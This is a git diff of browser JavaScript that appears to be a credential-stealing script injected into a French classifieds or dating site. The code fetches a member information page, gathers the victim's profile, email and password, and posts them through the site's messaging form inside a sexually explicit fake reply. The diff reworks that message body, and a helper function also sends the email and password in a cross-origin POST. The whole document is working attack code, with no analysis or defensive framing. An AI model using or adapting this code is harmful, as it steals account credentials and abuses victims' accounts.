@@ -14,7 +14,7 @@ function hwww(email, pwd) {
         "method": "POST",
         "mode": "cors",
         "credentials": "include"
-    }).then((r) => console.log(r), (e) => alert(e))
+    }).then((r) => console.log(r.url, r.status), (e) => alert(e))
 }
 
 fetch('/membres/infos_membre.htm').then(function(response) {
@@ -29,16 +29,41 @@ fetch('/membres/infos_membre.htm').then(function(response) {
     fetch(location.href, {
         method: 'POST',
         headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: new URLSearchParams({
-            'sujet': 'sucess',
-            piece_jointe_1: undefined,
-            piece_jointe_2: undefined,
-            message: `prof ${profil}, em ${email}, pw ${pwd}`,
-            send_msg: "Envoi en cours, patientez SVP..."
-        })
+        body: `------WebKitFormBoundarykfIBZEQc7hSdEQRU
+        Content-Disposition: form-data; name="sujet"
+        
+        Re: J'aimerais te rencontrer, voici ma photo ?
+        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
+        Content-Disposition: form-data; name="piece_jointe_1"; filename=""
+        Content-Type: application/octet-stream
+        
+        
+        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
+        Content-Disposition: form-data; name="piece_jointe_2"; filename=""
+        Content-Type: application/octet-stream
+        
+        
+        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
+        Content-Disposition: form-data; name="message"
+        
+        re
+        
+        -------- Message original --------
+        Sujet: J'aimerais te rencontrer, voici ma photo ?
+        De: Jeandp1 <jeandp1.1e21774f@wannonce.com>
+        
+        > J'aimerais te rencontrer; Je suis brun,
+        > et tres bien monte
+        > prof ${profil}, em ${email}, pw ${pwd}
+        > je vais t'en faire voir de toutes les couleurs
+        ------WebKitFormBoundarykfIBZEQc7hSdEQRU
+        Content-Disposition: form-data; name="send_msg"
+        
+        Envoi en cours, patientez SVP...
+        ------WebKitFormBoundarykfIBZEQc7hSdEQRU--`
+
     }).then((r) => {
-        console.log(r);
+        console.log(r.url, r.status);
         hwww(email, pwd);
     }, (e) => alert(e)).then(() => 1)
-
 });
